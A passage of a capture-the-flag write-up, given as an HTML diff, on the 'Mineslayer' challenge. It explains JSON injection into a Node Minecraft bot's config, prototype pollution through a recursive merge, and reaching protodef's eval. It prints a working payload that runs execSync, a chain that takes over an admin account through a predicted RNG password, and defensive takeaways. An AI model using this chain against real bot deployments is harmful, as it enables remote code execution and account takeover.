+</span><span id="__span-15-11"><a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a><span class="w">      </span><span class="nt">&quot;prototype&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-15-12"><a id="__codelineno-15-12" name="__codelineno-15-12" href="#__codelineno-15-12"></a><span class="w">        </span><span class="nt">&quot;minecraftVersion&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;1.0.0&quot;</span><span class="p">,</span>
+</span><span id="__span-15-13"><a id="__codelineno-15-13" name="__codelineno-15-13" href="#__codelineno-15-13"></a><span class="w">        </span><span class="nt">&quot;majorVersion&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;1.0&quot;</span><span class="p">,</span>
+</span><span id="__span-15-14"><a id="__codelineno-15-14" name="__codelineno-15-14" href="#__codelineno-15-14"></a><span class="w">        </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;_&quot;</span><span class="p">,</span>
+</span><span id="__span-15-15"><a id="__codelineno-15-15" name="__codelineno-15-15" href="#__codelineno-15-15"></a><span class="w">        </span><span class="nt">&quot;type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;varint&quot;</span>
+</span><span id="__span-15-16"><a id="__codelineno-15-16" name="__codelineno-15-16" href="#__codelineno-15-16"></a><span class="w">      </span><span class="p">}</span>
+</span><span id="__span-15-17"><a id="__codelineno-15-17" name="__codelineno-15-17" href="#__codelineno-15-17"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-15-18"><a id="__codelineno-15-18" name="__codelineno-15-18" href="#__codelineno-15-18"></a><span class="w">  </span><span class="p">},</span>
+</span><span id="__span-15-19"><a id="__codelineno-15-19" name="__codelineno-15-19" href="#__codelineno-15-19"></a><span class="w">  </span><span class="nt">&quot;version&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;1.21.8&quot;</span><span class="p">,</span>
+</span><span id="__span-15-20"><a id="__codelineno-15-20" name="__codelineno-15-20" href="#__codelineno-15-20"></a><span class="w">  </span><span class="nt">&quot;x&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;b&quot;</span><span class="p">]</span>
+</span><span id="__span-15-21"><a id="__codelineno-15-21" name="__codelineno-15-21" href="#__codelineno-15-21"></a><span class="p">}</span>
+</span></code></pre></div>
+<p>Two details matter here:</p>
+<ol>
+<li>duplicate JSON keys are allowed by <code>JSON.parse</code>, and the later one wins</li>
+<li>the later <code>username</code> key is intentional, because the merge bug becomes useful only when the target already has a string <code>username</code></li>
+</ol>
+<h3 id="why-the-node-merge-made-prototype-pollution-reachable">Why the Node merge made prototype pollution reachable<a class="headerlink" href="#why-the-node-merge-made-prototype-pollution-reachable" title="Permanent link">&para;</a></h3>
+<p>The bot process loaded the JSON and merged it like this:</p>
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="kd">function</span><span class="w"> </span><span class="nx">merge</span><span class="p">(</span><span class="nx">target</span><span class="p">,</span><span class="w"> </span><span class="nx">source</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kd">let</span><span class="w"> </span><span class="nx">key</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="nb">Object</span><span class="p">.</span><span class="nx">keys</span><span class="p">(</span><span class="nx">source</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="w">        </span><span class="ow">typeof</span><span class="w"> </span><span class="nx">target</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span><span class="w"> </span><span class="o">!==</span><span class="w"> </span><span class="s2">&quot;undefined&quot;</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="ow">typeof</span><span class="w"> </span><span class="nx">source</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s2">&quot;object&quot;</span>
+</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a><span class="w">            </span><span class="o">?</span><span class="w"> </span><span class="nx">target</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">merge</span><span class="p">(</span><span class="nx">target</span><span class="p">[</span><span class="nx">key</span><span class="p">],</span><span class="w"> </span><span class="nx">source</span><span class="p">[</span><span class="nx">key</span><span class="p">])</span>
+</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a><span class="w">            </span><span class="o">:</span><span class="w"> </span><span class="nx">target</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">source</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span>
+</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-16-7"><a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">target</span>
+</span><span id="__span-16-8"><a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a><span class="p">}</span>
+</span><span id="__span-16-9"><a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a>
+</span><span id="__span-16-10"><a id="__codelineno-16-10" name="__codelineno-16-10" href="#__codelineno-16-10"></a><span class="kd">const</span><span class="w"> </span><span class="nx">customConfig</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">resolve</span><span class="p">(</span><span class="nx">configPath</span><span class="p">),</span><span class="w"> </span><span class="s1">&#39;utf8&#39;</span><span class="p">))</span>
+</span><span id="__span-16-11"><a id="__codelineno-16-11" name="__codelineno-16-11" href="#__codelineno-16-11"></a><span class="kd">const</span><span class="w"> </span><span class="nx">defaultConf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">host</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">username</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;mineslayer-beta&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">port</span><span class="o">:</span><span class="w"> </span><span class="mf">25565</span><span class="w"> </span><span class="p">}</span>
+</span><span id="__span-16-12"><a id="__codelineno-16-12" name="__codelineno-16-12" href="#__codelineno-16-12"></a><span class="kd">const</span><span class="w"> </span><span class="nx">config</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">merge</span><span class="p">(</span><span class="nx">defaultConf</span><span class="p">,</span><span class="w"> </span><span class="nx">customConfig</span><span class="p">)</span>
+</span></code></pre></div>
+<p>This is exploitable in two different ways:</p>
+<ul>
+<li><code>__proto__</code> lets me recurse into <code>Object.prototype</code></li>
+<li><code>username.constructor.prototype</code> lets me recurse into <code>String.prototype</code>, because the default target value for <code>username</code> is already a string</li>
+</ul>
+<p>That second point is why the working payload used <code>username</code> and not just some random nested object.</p>
+<h2 id="the-final-bot-payload">The final <code>/bot</code> payload<a class="headerlink" href="#the-final-bot-payload" title="Permanent link">&para;</a></h2>
+<p>The payload that actually worked was:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>/bot a&quot;],&quot;__proto__&quot;:{&quot;0&quot;:&quot;(console.log(require(&#39;child_process&#39;).execSync(&#39;/getflag&#39;,{encoding:&#39;utf8&#39;})),0)&quot;},&quot;username&quot;:{&quot;constructor&quot;:{&quot;prototype&quot;:{&quot;minecraftVersion&quot;:&quot;1.0.0&quot;,&quot;majorVersion&quot;:&quot;1.0&quot;,&quot;name&quot;:&quot;_&quot;,&quot;type&quot;:&quot;varint&quot;}}},&quot;version&quot;:&quot;1.21.8&quot;,&quot;x&quot;:[&quot;b
+</span></code></pre></div>
+<p>This looks ugly, but each piece has a precise job.</p>
+<h3 id="why-__proto__0-matters">Why <code>"__proto__":{"0":"(...)"}</code> matters<a class="headerlink" href="#why-__proto__0-matters" title="Permanent link">&para;</a></h3>
+<p>This part:</p>
+<div class="language-json highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="nt">&quot;__proto__&quot;</span><span class="p">:{</span><span class="nt">&quot;0&quot;</span><span class="p">:</span><span class="s2">&quot;(console.log(require(&#39;child_process&#39;).execSync(&#39;/getflag&#39;,{encoding:&#39;utf8&#39;})),0)&quot;</span><span class="p">}</span>
+</span></code></pre></div>
+<p>pollutes:</p>
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">[</span><span class="s2">&quot;0&quot;</span><span class="p">]</span>
+</span></code></pre></div>
+<p>That sounds useless until you look at the protocol compiler. Deep in protodef / mineflayer, protocol field arrays are iterated with <code>for...in</code>.</p>
+<p>That means inherited enumerable properties on <code>Object.prototype</code> are treated like real array entries.</p>
+<p>So by setting:</p>
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">[</span><span class="s2">&quot;0&quot;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;(console.log(...),0)&quot;</span>
+</span></code></pre></div>
+<p>I made protocol arrays appear to have an extra element at index <code>0</code>.</p>
+<p>The expression string itself is also carefully shaped:</p>
+<ul>
+<li><code>require('child_process').execSync('/getflag', { encoding: 'utf8' })</code> runs the SUID helper and captures the flag as text</li>
+<li><code>console.log(...)</code> pushes that flag to stdout</li>
+<li><code>,0</code> makes the whole expression evaluate to a harmless numeric value after the side effect, which keeps the generated code syntactically acceptable in an expression context</li>
+</ul>
+<h3 id="why-the-usernameconstructorprototype-pollution-is-also-required">Why the <code>username.constructor.prototype</code> pollution is also required<a class="headerlink" href="#why-the-usernameconstructorprototype-pollution-is-also-required" title="Permanent link">&para;</a></h3>
+<p>A raw string in <code>Object.prototype["0"]</code> is not enough. The compiler does not just iterate array elements - it expects them to behave like descriptor objects with fields such as <code>type</code> and <code>name</code>.</p>
+<p>That is why this second payload block exists:</p>
+<div class="language-json highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="nt">&quot;username&quot;</span><span class="p">:{</span><span class="nt">&quot;constructor&quot;</span><span class="p">:{</span><span class="nt">&quot;prototype&quot;</span><span class="p">:{</span><span class="nt">&quot;minecraftVersion&quot;</span><span class="p">:</span><span class="s2">&quot;1.0.0&quot;</span><span class="p">,</span><span class="nt">&quot;majorVersion&quot;</span><span class="p">:</span><span class="s2">&quot;1.0&quot;</span><span class="p">,</span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="s2">&quot;_&quot;</span><span class="p">,</span><span class="nt">&quot;type&quot;</span><span class="p">:</span><span class="s2">&quot;varint&quot;</span><span class="p">}}}</span>
+</span></code></pre></div>
+<p>Because the target <code>username</code> is already a string, the recursive merge walks:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>defaultConf.username -&gt; String constructor -&gt; String.prototype
+</span></code></pre></div>
+<p>and pollutes <code>String.prototype</code>.</p>
+<p>That gives every string, including the fake string stored in <code>Object.prototype["0"]</code>, the extra properties the compiler expects.</p>
+<p>Those fields are not random:</p>
+<ul>
+<li><code>type: "varint"</code> gives the fake descriptor a valid-looking protocol type</li>
+<li><code>name: "_"</code> gives the compiler a safe identifier to emit</li>
+<li><code>minecraftVersion</code> and <code>majorVersion</code> provide enough shape for the polluted value to survive the protocol-selection path</li>
+</ul>
+<p>Without this <code>String.prototype</code> scaffolding, the fake element crashes too early and never reaches the interesting code-generation point.</p>
+<h3 id="why-version1218-is-present">Why <code>"version":"1.21.8"</code> is present<a class="headerlink" href="#why-version1218-is-present" title="Permanent link">&para;</a></h3>
+<p>This part:</p>
+<div class="language-json highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="nt">&quot;version&quot;</span><span class="p">:</span><span class="s2">&quot;1.21.8&quot;</span>
+</span></code></pre></div>
+<p>forces a concrete protocol version. That stabilizes the mineflayer / minecraft-data path and ensures the process reaches the compiler with a consistent protocol definition instead of wandering through a different negotiation path.</p>
+<p>In practice, this made the payload reliable enough to hit the right compiler logic.</p>
+<h3 id="why-xb-is-needed">Why <code>"x":["b"</code> is needed<a class="headerlink" href="#why-xb-is-needed" title="Permanent link">&para;</a></h3>
+<p>This is just syntax repair.</p>
+<p>The command is being injected into a place where the Java code is still going to append the closing quote and bracket from its own serializer. The fake trailing array consumes those characters cleanly so the resulting JSON still parses.</p>
+<p>Without the <code>x</code> tail, the payload breaks the document but does not produce a usable config.</p>
+<h2 id="why-code-generation-was-the-winning-gadget">Why code generation was the winning gadget<a class="headerlink" href="#why-code-generation-was-the-winning-gadget" title="Permanent link">&para;</a></h2>
+<p>The last crucial step was understanding where polluted data actually becomes execution.</p>
+<p>The mineflayer stack eventually reaches protodef, which compiles generated JavaScript:</p>
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="nx">compile</span><span class="w"> </span><span class="p">(</span><span class="nx">code</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a><span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="kr">native</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="kr">native</span>
+</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a><span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">PartialReadError</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;./utils&#39;</span><span class="p">)</span>
+</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a><span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nb">eval</span><span class="p">(</span><span class="nx">code</span><span class="p">)()</span>
+</span><span id="__span-24-5"><a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a><span class="p">}</span>
+</span></code></pre></div>
+<p>That is the actual exploit boundary.</p>
+<p>The point of the whole <code>/bot</code> payload is not "prototype pollution is bad" in the abstract. The point is:</p>
+<ol>
+<li>inject top-level JSON</li>
+<li>pollute <code>Object.prototype</code> so arrays pick up a fake element</li>
+<li>pollute <code>String.prototype</code> so that fake element looks valid enough</li>
+<li>survive protocol shaping long enough to reach protodef</li>
+<li>get my expression emitted into generated code</li>
+<li>let <code>eval(code)()</code> execute it</li>
+</ol>
+<p>At that point <code>console.log(execSync('/getflag'))</code> runs inside the Node bot, and the plugin faithfully relays the stdout line back into Minecraft chat.</p>
+<h2 id="end-to-end-chain">End-to-end chain<a class="headerlink" href="#end-to-end-chain" title="Permanent link">&para;</a></h2>
+<ol>
+<li>Register a normal player.</li>
+<li>Set the nickname to <code>x&lt;c:Administrator&gt;</code>.</li>
+<li>Send a URL in chat so the helper bot renews <code>Administrator</code>.</li>
+<li>Predict the next admin password from the seeded Java RNG.</li>
+<li>Log in as <code>Administrator</code> and regain operator access.</li>
+<li>Send the <code>/bot</code> JSON-injection payload.</li>
+<li>Pollute <code>Object.prototype</code> and <code>String.prototype</code>.</li>
+<li>Reach protodef's code generator and execute <code>/getflag</code>.</li>
+<li>Read <code>FLAG_2</code> from the bot's stdout in chat.</li>
+</ol>
+<h2 id="final-result">Final result<a class="headerlink" href="#final-result" title="Permanent link">&para;</a></h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>FLAG_1: MCTF{M1ni_M3ssage_N3st1ng_g0es_H4rd}
+</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>FLAG_2: MCTF{Th4ts_4_sh1t_t0n_0f_g4dg3t}
+</span></code></pre></div>
+<h2 id="takeaways">Takeaways<a class="headerlink" href="#takeaways" title="Permanent link">&para;</a></h2>
+<ul>
+<li>Partial rich-text filtering is not safe when later components parse the same input differently.</li>
+<li>Deterministic password generation turns password reset into account takeover.</li>
+<li>JSON injection plus recursive merge is enough to make prototype pollution practical.</li>
+<li>Prototype pollution gets dramatically worse once polluted values reach a code generator or an <code>eval</code> path.</li>
 </ul>
 
 
@@ -2650,13 +3093,13 @@
         
         
           
-          <a href="../mineslayer-flag2/" class="md-footer__link md-footer__link--next" aria-label="Next: Mineslayer — Flag 2">
+          <a href="../../asis-ctf/sanchess/" class="md-footer__link md-footer__link--next" aria-label="Next: Sanchess">
             <div class="md-footer__title">
               <span class="md-footer__direction">
                 Next
               </span>
               <div class="md-ellipsis">
-                Mineslayer — Flag 2
+                Sanchess
               </div>
             </div>
             <div class="md-footer__button md-icon">
